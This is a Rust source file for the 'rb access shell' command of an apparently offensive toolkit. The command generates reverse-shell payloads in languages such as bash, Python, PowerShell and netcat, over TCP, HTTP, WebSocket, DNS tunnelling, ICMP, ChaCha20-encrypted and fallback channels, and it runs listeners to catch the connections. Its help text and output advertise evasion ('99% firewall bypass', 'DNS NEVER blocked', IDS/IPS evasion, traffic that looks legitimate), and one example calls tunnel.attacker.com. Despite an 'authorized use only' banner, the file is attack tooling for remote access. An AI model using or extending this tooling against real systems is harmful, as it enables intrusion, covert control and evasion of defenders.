/// Remote Access & Post-Exploitation CLI Commands
///
/// ⚠️ AUTHORIZED USE ONLY ⚠️
///
/// Domain: access
/// Resource: shell
/// Verbs: create, listen, sessions, kill
///
/// Examples:
///   rb access shell create 10.0.0.1:4444 --protocol tcp --type python
///   rb access shell listen 4444 --protocol websocket
///
use crate::cli::commands::{Command, Flag, Route};
use crate::cli::output::Output;
use crate::cli::CliContext;
use crate::modules::exploit::{
    listener::ExploitListener,
    payloads::{MultiHandlerConfig, PayloadConfig, PayloadGenerator, ShellType},
};

pub struct AccessCommand;

impl Command for AccessCommand {
    fn domain(&self) -> &str {
        "access"
    }

    fn resource(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Remote access - reverse shells, listeners, session management"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "create",
                summary: "Generate reverse shell payload",
                usage: "rb access shell create <ip:port|domain> --protocol <tcp|http|websocket|dns|icmp|encrypted|multi> --type <shell>",
            },
            Route {
                verb: "listen",
                summary: "Start reverse shell listener",
                usage: "rb access shell listen <port> --protocol <tcp|http|dns|websocket>",
            },
            Route {
                verb: "sessions",
                summary: "List active reverse shell sessions",
                usage: "rb access shell sessions",
            },
            Route {
                verb: "kill",
                summary: "Kill active session by ID",
                usage: "rb access shell kill <session_id>",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new(
                "protocol",
                "Shell protocol (tcp|http|websocket|dns|icmp|encrypted|multi)",
            )
            .with_short('p')
            .with_default("tcp")
            .with_arg("PROTOCOL"),
            Flag::new(
                "type",
                "Shell language (bash|python|php|powershell|nc|socat|node|perl|ruby|awk|java)",
            )
            .with_short('t')
            .with_default("bash")
            .with_arg("SHELL"),
            Flag::new("tcp-port", "TCP port for multi-handler").with_default("4444"),
            Flag::new("http-port", "HTTP port for multi-handler").with_default("8080"),
            Flag::new(
                "key",
                "ChaCha20 encryption key (32 bytes, base64). Auto-generated if not provided",
            )
            .with_short('k')
            .with_arg("KEY"),
            Flag::new(
                "nonce",
                "ChaCha20 nonce (12 bytes, base64). Auto-generated if not provided",
            )
            .with_short('n')
            .with_arg("NONCE"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "TCP reverse shell (Python)",
                "rb access shell create 10.0.0.1:4444 --protocol tcp --type python",
            ),
            (
                "WebSocket shell (Node.js) - 99% firewall bypass!",
                "rb access shell create 10.0.0.1:8080 --protocol websocket --type node",
            ),
            (
                "DNS tunneling shell - NEVER blocked!",
                "rb access shell create tunnel.attacker.com --protocol dns --type bash",
            ),
            (
                "Encrypted shell (IDS/IPS evasion)",
                "rb access shell create 10.0.0.1:4444 --protocol encrypted --type python",
            ),
            (
                "Start TCP listener",
                "rb access shell listen 4444 --protocol tcp",
            ),
            (
                "Start WebSocket listener",
                "rb access shell listen 8080 --protocol websocket",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_ref().ok_or_else(|| {
            "Missing verb. Use: rb access shell <verb>\nTry: rb access shell help".to_string()
        })?;

        match verb.as_str() {
            "create" => self.create_shell(ctx),
            "listen" => self.listen_shell(ctx),
            "sessions" => self.list_sessions(ctx),
            "kill" => self.kill_session(ctx),
            "help" => {
                crate::cli::commands::print_help(self);
                Ok(())
            }
            _ => Err(format!(
                "Unknown verb '{}'. Use: rb access shell help",
                verb
            )),
        }
    }
}

impl AccessCommand {
    /// Unified shell creation - dispatches based on --protocol flag
    fn create_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let protocol = ctx.get_flag_or("protocol", "tcp");
        let shell_type = ctx.get_flag_or("type", "bash");
        let target = ctx.target.as_ref().ok_or(
            "Missing target. Usage: rb access shell create <ip:port|domain> --protocol <protocol>",
        )?;

        match protocol.to_lowercase().as_str() {
            "tcp" => self.generate_tcp_shell(target, &shell_type),
            "http" => self.generate_http_shell(target, &shell_type),
            "websocket" => self.generate_websocket_shell(target, &shell_type),
            "dns" => self.generate_dns_shell(target, &shell_type),
            "icmp" => self.generate_icmp_shell(target, &shell_type),
            "encrypted" => self.generate_encrypted_shell(ctx, target, &shell_type),
            "multi" => self.generate_multi_shell(ctx, target, &shell_type),
            _ => Err(format!(
                "Unknown protocol: {}. Use: tcp, http, websocket, dns, icmp, encrypted, multi",
                protocol
            )),
        }
    }

    /// Start listener - dispatches based on --protocol flag
    fn listen_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let protocol = ctx.get_flag_or("protocol", "tcp");
        let port = ctx
            .target
            .as_ref()
            .ok_or("Missing port. Usage: rb access shell listen <port> --protocol <protocol>")?;

        let port_num: u16 = port
            .parse()
            .map_err(|_| format!("Invalid port: {}", port))?;

        match protocol.to_lowercase().as_str() {
            "tcp" => {
                Output::header("Native TCP Listener");
                Output::item("Port", port);
                Output::item("Protocol", "TCP");
                println!();

                println!("\x1b[1m🎧 Starting TCP listener...\x1b[0m");
                println!("  • Press Ctrl+C to stop");
                println!("  • Waiting for reverse shell connections\n");

                let listener = ExploitListener::new_tcp(port_num);
                listener.start()
            }
            "http" => {
                Output::header("Native HTTP Listener");
                Output::item("Port", port);
                Output::item("Protocol", "HTTP (Firewall Bypass)");
                println!();

                println!("\x1b[1m🎧 Starting HTTP listener...\x1b[0m");
                println!("  • Press Ctrl+C to stop");
                println!("  • Bypasses most firewalls\n");

                let listener = ExploitListener::new_http(port_num);
                listener.start()
            }
            "dns" => {
                Output::header("Native DNS Listener");
                Output::item("Port", port);
                Output::item("Protocol", "DNS Tunneling (99% Bypass!)");
                println!();

                println!("\x1b[1m🎧 Starting DNS listener...\x1b[0m");
                println!("  • Press Ctrl+C to stop");
                println!("  • ⚠️  Requires root/sudo (port 53)\n");

                if port_num != 53 {
                    println!("\x1b[33m⚠️  Warning: DNS typically uses port 53\x1b[0m\n");
                }

                let listener = ExploitListener::new_dns(port_num);
                listener.start()
            }
            "websocket" => {
                Output::header("Native WebSocket Listener (RFC 6455)");
                Output::item("Port", port);
                Output::item("Protocol", "WebSocket");
                println!();

                println!("\x1b[1m🎧 Starting WebSocket listener...\x1b[0m");
                println!("  • Press Ctrl+C to stop");
                println!("  • Native implementation - NO external tools!\n");

                if port_num == 80 || port_num == 443 {
                    println!("\x1b[32m✅ Standard HTTP/HTTPS port - maximum bypass!\x1b[0m\n");
                }

                let listener = ExploitListener::new_websocket(port_num);
                listener.start()
            }
            _ => Err(format!(
                "Unknown protocol: {}. Use: tcp, http, dns, websocket",
                protocol
            )),
        }
    }

    /// List active sessions
    fn list_sessions(&self, _ctx: &CliContext) -> Result<(), String> {
        Output::header("Active Reverse Shell Sessions");

        println!("\n\x1b[33m⚠️  Session management requires running listener\x1b[0m\n");
        println!("To start a listener:");
        println!("  rb access shell listen 4444 --protocol tcp\n");

        Ok(())
    }

    /// Kill session by ID
    fn kill_session(&self, ctx: &CliContext) -> Result<(), String> {
        let session_id = ctx
            .target
            .as_ref()
            .ok_or("Missing session ID. Usage: rb access shell kill <session_id>")?
            .parse::<u32>()
            .map_err(|_| "Invalid session ID. Must be a number")?;

        Output::header("Kill Session");
        Output::item("Session ID", &session_id.to_string());

        Output::warning("Session management requires running listener");
        println!("\nSession {} will be terminated if active.", session_id);

        Ok(())
    }

    /// Parse target as IP:PORT
    fn parse_target(&self, target: &str) -> Result<(String, u16), String> {
        if let Some((ip, port_str)) = target.split_once(':') {
            let port: u16 = port_str
                .parse()
                .map_err(|_| format!("Invalid port: {}", port_str))?;
            Ok((ip.to_string(), port))
        } else {
            Err(format!(
                "Invalid target. Expected IP:PORT (e.g., 10.0.0.1:4444), got: {}",
                target
            ))
        }
    }

    /// Parse shell type enum
    fn parse_shell_type(&self, shell_type: &str) -> Result<ShellType, String> {
        match shell_type.to_lowercase().as_str() {
            "bash" => Ok(ShellType::Bash),
            "python" | "py" => Ok(ShellType::Python),
            "perl" | "pl" => Ok(ShellType::Perl),
            "php" => Ok(ShellType::PHP),
            "ruby" | "rb" => Ok(ShellType::Ruby),
            "nc" | "netcat" => Ok(ShellType::Netcat),
            "powershell" | "ps1" | "pwsh" => Ok(ShellType::PowerShell),
            "socat" => Ok(ShellType::Socat),
            "awk" => Ok(ShellType::Awk),
            "java" => Ok(ShellType::Java),
            "node" | "nodejs" | "js" => Ok(ShellType::Node),
            _ => Err(format!(
                "Unknown shell type: {}. Available: bash, python, perl, php, ruby, nc, powershell, socat, awk, java, node",
                shell_type
            )),
        }
    }

    /// Generate TCP reverse shell
    fn generate_tcp_shell(&self, target: &str, shell_type: &str) -> Result<(), String> {
        let (lhost, lport) = self.parse_target(target)?;
        let shell = self.parse_shell_type(shell_type)?;

        Output::header(&format!("TCP Reverse Shell - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport,
        };

        let payload = PayloadGenerator::generate_reverse_shell(shell, &config);

        Output::item("Protocol", "TCP");
        Output::item("Listener", &format!("{}:{}", lhost, lport));
        Output::item("Shell Type", shell_type);

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m🎧 Start Listener:\x1b[0m");
        println!("  rb access shell listen {} --protocol tcp", lport);

        Ok(())
    }

    /// Generate HTTP reverse shell
    fn generate_http_shell(&self, target: &str, shell_type: &str) -> Result<(), String> {
        let (lhost, lport) = self.parse_target(target)?;
        let shell = self.parse_shell_type(shell_type)?;

        Output::header(&format!("HTTP Reverse Shell - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport,
        };

        let payload = PayloadGenerator::generate_http_reverse_shell(shell, &config);

        Output::item("Protocol", "HTTP (Firewall Bypass)");
        Output::item("Listener", &format!("{}:{}", lhost, lport));
        Output::item("Shell Type", shell_type);

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m🎧 Start Listener:\x1b[0m");
        println!("  rb access shell listen {} --protocol http", lport);

        println!("\n\x1b[1m✨ Advantages:\x1b[0m");
        println!("  • Bypasses 80% of firewalls");
        println!("  • Works through HTTP proxies");
        println!("  • Looks like normal web traffic");

        Ok(())
    }

    /// Generate WebSocket reverse shell
    fn generate_websocket_shell(&self, target: &str, shell_type: &str) -> Result<(), String> {
        let (lhost, lport) = self.parse_target(target)?;
        let shell = self.parse_shell_type(shell_type)?;

        Output::header(&format!(
            "WebSocket Reverse Shell (RFC 6455) - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport,
        };

        let payload = PayloadGenerator::generate_websocket_reverse_shell(shell, &config);

        Output::item("Protocol", "WebSocket (RFC 6455)");
        Output::item("Listener", &format!("{}:{}", lhost, lport));
        Output::item("Shell Type", shell_type);
        Output::item("Firewall Bypass", "99% (HTTP/HTTPS ports)");

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m🎧 Start Listener:\x1b[0m");
        println!("  ✅ Native WebSocket listener - NO external tools needed!");
        println!("  rb access shell listen {} --protocol websocket", lport);

        println!("\n\x1b[1m✨ Advantages:\x1b[0m");
        println!("  • Bypasses 99% of firewalls (uses HTTP/HTTPS ports)");
        println!("  • Persistent bidirectional connection");
        println!("  • Looks like legitimate web application");

        Ok(())
    }

    /// Generate DNS tunneling shell
    fn generate_dns_shell(&self, domain: &str, shell_type: &str) -> Result<(), String> {
        let shell = self.parse_shell_type(shell_type)?;

        Output::header(&format!("DNS Tunneling Shell - {}", shell_type));

        let config = PayloadConfig {
            lhost: domain.to_string(),
            lport: 53,
        };

        let payload = PayloadGenerator::generate_dns_reverse_shell(shell, &config);

        Output::item("Protocol", "DNS Tunneling (99% Bypass!)");
        Output::item("Domain", domain);
        Output::item("Shell Type", shell_type);

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m🎧 Start Listener:\x1b[0m");
        println!("  sudo rb access shell listen 53 --protocol dns");

        println!("\n\x1b[1m✨ Advantages:\x1b[0m");
        println!("  • Bypasses 99% of firewalls (DNS NEVER blocked!)");
        println!("  • Maximum stealth");
        println!("  • Works behind NAT/firewalls");

        println!("\n\x1b[1m⚠️  Requirements:\x1b[0m");
        println!("  • You must own the domain: {}", domain);
        println!("  • Configure NS record to your server");

        Ok(())
    }

    /// Generate ICMP reverse shell
    fn generate_icmp_shell(&self, target: &str, shell_type: &str) -> Result<(), String> {
        let shell = self.parse_shell_type(shell_type)?;

        Output::header(&format!(
            "ICMP Reverse Shell (Ping Tunneling) - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: target.to_string(),
            lport: 0, // ICMP doesn't use ports
        };

        let payload = PayloadGenerator::generate_icmp_reverse_shell(shell, &config);

        Output::item("Protocol", "ICMP (Ping Tunneling)");
        Output::item("Target", target);
        Output::item("Shell Type", shell_type);
        Output::item("Firewall Bypass", "95% (ICMP rarely blocked)");

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m⚠️  ICMP listener not yet implemented");
        println!("Use external tool: icmpsh, prism, or ptunnel");

        Ok(())
    }

    /// Generate encrypted shell (ChaCha20)
    fn generate_encrypted_shell(
        &self,
        ctx: &CliContext,
        target: &str,
        shell_type: &str,
    ) -> Result<(), String> {
        use crate::crypto::chacha20::{encode_base64, generate_key, generate_nonce};

        let (lhost, lport) = self.parse_target(target)?;
        let shell = self.parse_shell_type(shell_type)?;

        // Generate or use provided key/nonce
        let key_b64 = if let Some(k) = ctx.get_flag("key") {
            k.clone()
        } else {
            let key = generate_key();
            encode_base64(&key)
        };

        let nonce_b64 = if let Some(n) = ctx.get_flag("nonce") {
            n.clone()
        } else {
            let nonce = generate_nonce();
            encode_base64(&nonce)
        };

        Output::header(&format!(
            "Encrypted Reverse Shell (ChaCha20) - {}",
            shell_type
        ));

        let payload = PayloadGenerator::generate_encrypted_shell(shell, &key_b64, &nonce_b64);

        Output::item("Protocol", "TCP + ChaCha20");
        Output::item("Listener", &format!("{}:{}", lhost, lport));
        Output::item("Shell Type", shell_type);
        Output::item("Encryption", "ChaCha20-256 (RFC 7539)");
        Output::item("Key (base64)", &key_b64);
        Output::item("Nonce (base64)", &nonce_b64);

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m🎧 Start Listener:\x1b[0m");
        println!("  rb access shell listen {} --protocol tcp", lport);
        println!("  (Implement ChaCha20 decryption on listener side)");

        println!("\n\x1b[1m✨ Advantages:\x1b[0m");
        println!("  • End-to-end encryption");
        println!("  • Bypasses IDS/IPS signature detection");
        println!("  • No cleartext commands/output");

        Ok(())
    }

    /// Generate multi-handler shell (TCP → HTTP → DNS fallback)
    fn generate_multi_shell(
        &self,
        ctx: &CliContext,
        target: &str,
        shell_type: &str,
    ) -> Result<(), String> {
        let (lhost, _) = self.parse_target(target)?;
        let shell = self.parse_shell_type(shell_type)?;

        let tcp_port = ctx.get_flag_or("tcp-port", "4444");
        let http_port = ctx.get_flag_or("http-port", "8080");

        let tcp_port_num: u16 = tcp_port
            .parse()
            .map_err(|_| format!("Invalid TCP port: {}", tcp_port))?;
        let http_port_num: u16 = http_port
            .parse()
            .map_err(|_| format!("Invalid HTTP port: {}", http_port))?;

        Output::header(&format!(
            "Multi-Handler Shell (TCP→HTTP→DNS) - {}",
            shell_type
        ));

        let config = MultiHandlerConfig {
            lhost: lhost.clone(),
            tcp_port: tcp_port_num,
            http_port: http_port_num,
            dns_domain: None,
        };

        let payload = PayloadGenerator::generate_multi_handler(shell, &config);

        Output::item("Protocol", "Multi (TCP → HTTP fallback)");
        Output::item("Listener Host", &lhost);
        Output::item("TCP Port", &&tcp_port);
        Output::item("HTTP Port", &&http_port);
        Output::item("Shell Type", shell_type);

        println!("\n\x1b[1m📋 Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1m🎧 Start Listeners:\x1b[0m");
        println!("  # Terminal 1");
        println!("  rb access shell listen {} --protocol tcp", tcp_port);
        println!("\n  # Terminal 2");
        println!("  rb access shell listen {} --protocol http", http_port);

        println!("\n\x1b[1m✨ Advantages:\x1b[0m");
        println!("  • Maximum reliability - automatic fallback");
        println!("  • TCP first (fastest)");
        println!("  • HTTP if TCP blocked (80% bypass)");

        Ok(())
    }
}
